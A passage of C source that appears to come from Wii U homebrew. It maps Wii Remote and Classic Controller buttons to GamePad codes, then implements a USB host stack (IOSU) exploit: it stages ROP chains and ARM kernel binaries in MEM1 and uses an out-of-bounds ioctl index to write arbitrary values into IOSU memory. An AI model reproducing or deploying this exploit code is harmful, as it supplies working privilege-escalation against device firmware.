	if(buttons & WPAD_BUTTON_LEFT)
		conv_buttons |= VPAD_BUTTON_LEFT;

	if(buttons & WPAD_BUTTON_RIGHT)
		conv_buttons |= VPAD_BUTTON_RIGHT;

	if(buttons & WPAD_BUTTON_DOWN)
		conv_buttons |= VPAD_BUTTON_DOWN;

	if(buttons & WPAD_BUTTON_UP)
		conv_buttons |= VPAD_BUTTON_UP;

	if(buttons & WPAD_BUTTON_PLUS)
		conv_buttons |= VPAD_BUTTON_PLUS;

	if(buttons & WPAD_BUTTON_2)
		conv_buttons |= VPAD_BUTTON_X;

	if(buttons & WPAD_BUTTON_1)
		conv_buttons |= VPAD_BUTTON_Y;

	if(buttons & WPAD_BUTTON_B)
		conv_buttons |= VPAD_BUTTON_B;

	if(buttons & WPAD_BUTTON_A)
		conv_buttons |= VPAD_BUTTON_A;

	if(buttons & WPAD_BUTTON_MINUS)
		conv_buttons |= VPAD_BUTTON_MINUS;

	if(buttons & WPAD_BUTTON_HOME)
		conv_buttons |= VPAD_BUTTON_HOME;

	return conv_buttons;
}

static unsigned int wpadClassicToVpad(unsigned int buttons)
{
	unsigned int conv_buttons = 0;

	if(buttons & WPAD_CLASSIC_BUTTON_LEFT)
		conv_buttons |= VPAD_BUTTON_LEFT;

	if(buttons & WPAD_CLASSIC_BUTTON_RIGHT)
		conv_buttons |= VPAD_BUTTON_RIGHT;

	if(buttons & WPAD_CLASSIC_BUTTON_DOWN)
		conv_buttons |= VPAD_BUTTON_DOWN;

	if(buttons & WPAD_CLASSIC_BUTTON_UP)
		conv_buttons |= VPAD_BUTTON_UP;

	if(buttons & WPAD_CLASSIC_BUTTON_PLUS)
		conv_buttons |= VPAD_BUTTON_PLUS;

	if(buttons & WPAD_CLASSIC_BUTTON_X)
		conv_buttons |= VPAD_BUTTON_X;

	if(buttons & WPAD_CLASSIC_BUTTON_Y)
		conv_buttons |= VPAD_BUTTON_Y;

	if(buttons & WPAD_CLASSIC_BUTTON_B)
		conv_buttons |= VPAD_BUTTON_B;

	if(buttons & WPAD_CLASSIC_BUTTON_A)
		conv_buttons |= VPAD_BUTTON_A;

	if(buttons & WPAD_CLASSIC_BUTTON_MINUS)
		conv_buttons |= VPAD_BUTTON_MINUS;

	if(buttons & WPAD_CLASSIC_BUTTON_HOME)
		conv_buttons |= VPAD_BUTTON_HOME;

	if(buttons & WPAD_CLASSIC_BUTTON_ZR)
		conv_buttons |= VPAD_BUTTON_ZR;

	if(buttons & WPAD_CLASSIC_BUTTON_ZL)
		conv_buttons |= VPAD_BUTTON_ZL;

	if(buttons & WPAD_CLASSIC_BUTTON_R)
		conv_buttons |= VPAD_BUTTON_R;

	if(buttons & WPAD_CLASSIC_BUTTON_L)
		conv_buttons |= VPAD_BUTTON_L;

	return conv_buttons;
}

static unsigned int getButtonsDown(unsigned int padscore_handle, unsigned int vpad_handle)
{
	int(*WPADProbe)(int chan, int * pad_type);
	int(*KPADRead)(int chan, void * data, int size);
	OSDynLoad_FindExport(padscore_handle, 0, "WPADProbe",&WPADProbe);
	OSDynLoad_FindExport(padscore_handle, 0, "KPADRead",&KPADRead);

	unsigned int btnDown = 0;

	int(*VPADRead)(int controller, VPADData *buffer, unsigned int num, int *error);
	OSDynLoad_FindExport(vpad_handle, 0, "VPADRead", &VPADRead);

    int vpadError = -1;
    VPADData vpad;
	VPADRead(0, &vpad, 1, &vpadError);
	if(vpadError == 0)
		btnDown |= vpad.btns_d;

	int i;
	for(i = 0; i < 4; i++)
	{
		int controller_type;
		if(WPADProbe(i, &controller_type) != 0)
			continue;
		KPADData kpadData;
		KPADRead(i, &kpadData, 1);
		if(kpadData.device_type <= 1)
			btnDown |= wpadToVpad(kpadData.btns_d);
		else
			btnDown |= wpadClassicToVpad(kpadData.classic.btns_d);
	}

	return btnDown;
}

static void uhs_exploit_init(unsigned int coreinit_handle)
{
   void (*DCStoreRange)(const void *addr, uint32_t length);
   OSDynLoad_FindExport(coreinit_handle, 0, "DCStoreRange", &DCStoreRange);

   //! Clear out our used MEM1 area
   memset((void*)0xF5E00000, 0, 0x00070000);
   DCStoreRange((void*)0xF5E00000, 0x00070000);

   //!------Variables used in exploit------
   int *pretend_root_hub = (int*)0xF5E60640;
   int *ayylmao = (int*)0xF5E00000;
   //!-------------------------------------

   ayylmao[5] = 1;
   ayylmao[8] = 0x1E00000;

   memcpy((char*)(0xF5E20000), second_chain, sizeof(second_chain));
   memcpy((char*)(0xF5E30000), final_chain, sizeof(final_chain));
   memcpy((char*)(0xF5E40000), arm_kernel_bin, sizeof(arm_kernel_bin));
   memcpy((char*)(0xF5E50000), arm_user_bin, sizeof(arm_user_bin));

   pretend_root_hub[33] = 0x1E00000;
   pretend_root_hub[78] = 0;

   //! Store current CPU cache into main memory for IOSU to read
   DCStoreRange(ayylmao, 0x840);

   DCStoreRange((void*)0xF5E20000, sizeof(second_chain));
   DCStoreRange((void*)0xF5E30000, sizeof(final_chain));
   DCStoreRange((void*)0xF5E40000, sizeof(arm_kernel_bin));
   DCStoreRange((void*)0xF5E50000, sizeof(arm_user_bin));

   DCStoreRange(pretend_root_hub, 0x160);
}

static int uhs_write32(unsigned int coreinit_handle, int dev_uhs_0_handle, int arm_addr, int val)
{
   void (*DCStoreRange)(const void *addr, uint32_t length);
   void (*OSSleepTicks)(uint64_t ticks);
   int (*IOS_Ioctl)(int fd, uint32_t request, void *input_buffer,uint32_t input_buffer_len, void *output_buffer, uint32_t output_buffer_len);
   OSDynLoad_FindExport(coreinit_handle, 0, "DCStoreRange", &DCStoreRange);
   OSDynLoad_FindExport(coreinit_handle, 0, "OSSleepTicks", &OSSleepTicks);
   OSDynLoad_FindExport(coreinit_handle, 0, "IOS_Ioctl", &IOS_Ioctl);

   //!------Variables used in exploit------
   int *ayylmao = (int*)0xF5E00000;
   //!-------------------------------------

   ayylmao[520] = arm_addr - 24;                  //! The address to be overwritten, minus 24 bytes
   DCStoreRange(ayylmao, 0x840);                  //! Store current CPU cache into main memory for IOSU to read
   OSSleepTicks(0x200000);                        //! Wait for caches to refresh over in IOSU
   //! index 0 is at 0x10149A6C, each index is 0x144 bytes long, so 0x10149A6C - (0x144*0xB349B) = 0x1E60640,
   //! which is the physical address of 0xF5E60640 for us, right at the end of MEM1
   int request_buffer[] = { -(0xB349B), val };
   int output_buffer[32];
   return IOS_Ioctl(dev_uhs_0_handle, 0x15, request_buffer, sizeof(request_buffer), output_buffer, sizeof(output_buffer));
}
